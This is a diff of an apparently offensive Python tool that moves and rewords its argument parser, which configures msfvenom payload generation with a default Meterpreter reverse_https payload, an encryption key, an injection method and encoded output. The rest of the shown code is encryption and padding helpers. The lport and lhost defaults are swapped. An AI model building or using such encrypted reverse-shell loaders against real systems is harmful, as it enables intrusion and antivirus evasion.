@@ -62,6 +62,26 @@ def main():
 		print("\n[+] Have a nice day!")
 		return
 
+def parse_args():
+	parser = argparse.ArgumentParser()
+
+	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
+		help="Enter local port that msfconsole will run")
+	parser.add_argument("-i", "--lhost", default="443", type=str,
+			help="Enter local host that msfconsole will run.")
+	parser.add_argument("-p", "--payload", default = "windows/x64/meterpreter/reverse_https", type=str,
+		help="Enter payload type e.g. windows/x64/meterpreter/reverse_https")
+	parser.add_argument("-m", "--method", default="thread", type=str,
+		help="Enter method e.g. thread/process")
+	parser.add_argument("-k", "--key", default="", type=str,
+		help="Enter the encryption key if self-generated key is not desired")
+
+
+	parser.add_argument("-f", "--format", default="b64", type=str,
+		help="Enter the format for the output")
+
+	return parser.parse_args()
+	
 def encrypt(key,iv,plaintext):
 	key_length = len(key)
 	if (key_length >= 32):
@@ -89,26 +109,6 @@ def pad(data, block_size):
 		padding_size = block_size
 	padding = (bytes([padding_size]) * padding_size)
 	return data + padding
-
-def parse_args():
-	parser = argparse.ArgumentParser()
-
-	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
-		help="The local port that msfconsole is listening on.")
-	parser.add_argument("-i", "--lhost", default="443", type=str,
-			help="The local host that msfconsole is listening on.")
-	parser.add_argument("-p", "--payload", default = "windows/x64/meterpreter/reverse_https", type=str,
-		help="The payload to generate in msfvenom.")
-	parser.add_argument("-m", "--method", default="thread", type=str,
-		help="The method to use: thread/delegate.")
-	parser.add_argument("-k", "--key", default="", type=str,
-		help="The encryption key (32 chars).")
-
-
-	parser.add_argument("-f", "--format", default="b64", type=str,
-		help="The format to output.")
-
-	return parser.parse_args()
 
 def get_random_string(length):
 	letters = string.ascii_letters + string.digits
